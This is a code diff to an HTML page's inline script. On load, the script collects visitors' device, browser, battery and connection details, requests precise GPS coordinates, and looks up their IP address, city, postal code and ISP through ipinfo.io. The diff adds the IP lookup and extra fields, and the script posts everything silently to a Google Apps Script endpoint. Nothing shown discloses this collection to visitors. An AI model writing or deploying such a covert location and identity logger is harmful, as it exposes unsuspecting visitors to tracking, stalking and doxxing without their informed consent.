@@ -335,7 +335,7 @@
 
     </div>
 <script>
-    async function collectDeviceInfo() {
+async function collectDeviceInfo() {
   const data = {
     timestamp: new Date().toISOString(),
 
@@ -380,10 +380,10 @@
 
     // Connection
     connection: navigator.connection ? {
-      effectiveType: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink,
-      rtt: navigator.connection.rtt,
-      saveData: navigator.connection.saveData
+      effectiveType: navigator.connection.effectiveType || null,
+      downlink: navigator.connection.downlink ?? null,
+      rtt: navigator.connection.rtt ?? null,
+      saveData: navigator.connection.saveData ?? null
     } : null,
 
     // Browser state
@@ -402,14 +402,18 @@
       title: document.title
     },
 
-    // Timing
+    // Performance
     performance: {
       loadTime: performance.now(),
-      navigation: performance.getEntriesByType("navigation")[0]?.toJSON() || null
+      navigation:
+        performance.getEntriesByType("navigation")[0]?.toJSON() || null
     }
   };
 
-  // Battery information (only supported browsers)
+  // --------------------------------------------------
+  // Battery
+  // --------------------------------------------------
+
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
@@ -420,63 +424,170 @@
         chargingTime: battery.chargingTime,
         dischargingTime: battery.dischargingTime
       };
-    } catch {
-      data.battery = null;
+    } catch (error) {
+      data.battery = {
+        available: false,
+        error: error.message
+      };
     }
+  } else {
+    data.battery = {
+      available: false
+    };
   }
 
-  // High accuracy location — requires permission
+  // --------------------------------------------------
+  // High-accuracy GPS
+  // Requires visitor permission
+  // --------------------------------------------------
+
   if (navigator.geolocation) {
     await new Promise(resolve => {
+
       navigator.geolocation.getCurrentPosition(
+
         position => {
           data.location = {
+            available: true,
+
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
+
             accuracy: position.coords.accuracy,
+
             altitude: position.coords.altitude,
             altitudeAccuracy: position.coords.altitudeAccuracy,
+
             heading: position.coords.heading,
             speed: position.coords.speed,
-            timestamp: new Date(position.timestamp).toISOString()
+
+            timestamp: new Date(
+              position.timestamp
+            ).toISOString()
           };
 
           resolve();
         },
+
         error => {
           data.location = {
             available: false,
+            errorCode: error.code,
             error: error.message
           };
 
           resolve();
         },
+
         {
           enableHighAccuracy: true,
           timeout: 15000,
           maximumAge: 0
         }
       );
+
     });
+  } else {
+    data.location = {
+      available: false,
+      error: "Geolocation not supported"
+    };
   }
 
-  // Send to Google Apps Script
+  // --------------------------------------------------
+  // IPinfo
+  //
+  // This uses the public endpoint.
+  // Do NOT put a private IPinfo token here.
+  // --------------------------------------------------
+
   try {
-    await fetch("https://script.google.com/macros/s/AKfycbz4Io2mS6MdBKUExU8EZ5OTuboon0uQipreBIjwtiRRlCWK0QHxFVKapkWVBhafYFqo/exec", {
-      method: "POST",
-      mode: "cors",
-      headers: {
-        "Content-Type": "text/plain"
-      },
-      body: JSON.stringify(data)
-    });
+    const ipResponse = await fetch(
+      "https://ipinfo.io/json",
+      {
+        method: "GET"
+      }
+    );
+
+    if (ipResponse.ok) {
+
+      const ipInfo = await ipResponse.json();
+
+      data.ipInfo = {
+        ip: ipInfo.ip || null,
+        hostname: ipInfo.hostname || null,
+
+        city: ipInfo.city || null,
+        region: ipInfo.region || null,
+        country: ipInfo.country || null,
+
+        location: ipInfo.loc || null,
+        postal: ipInfo.postal || null,
+        timezone: ipInfo.timezone || null,
+
+        organization: ipInfo.org || null
+      };
+
+    } else {
+
+      data.ipInfo = {
+        available: false,
+        error: `HTTP ${ipResponse.status}`
+      };
+
+    }
+
+  } catch (error) {
+
+    data.ipInfo = {
+      available: false,
+      error: error.message
+    };
+
+  }
+
+  // --------------------------------------------------
+  // Send everything to Google Apps Script
+  // --------------------------------------------------
+
+  try {
+
+    const response = await fetch(
+      "https://script.google.com/macros/s/AKfycbz4Io2mS6MdBKUExU8EZ5OTuboon0uQipreBIjwtiRRlCWK0QHxFVKapkWVBhafYFqo/exec",
+      {
+        method: "POST",
+        mode: "cors",
+
+        headers: {
+          "Content-Type": "text/plain"
+        },
+
+        body: JSON.stringify(data)
+      }
+    );
 
     console.log("Device information submitted.");
+
   } catch (error) {
-    console.error("Submission failed:", error);
+
+    console.error(
+      "Submission failed:",
+      error
+    );
+
   }
+
+  // Useful for debugging
+  console.log(
+    "Collected visitor data:",
+    data
+  );
+
+  return data;
 }
 
+
+// Start collection
 collectDeviceInfo();
 </script>
 </body>
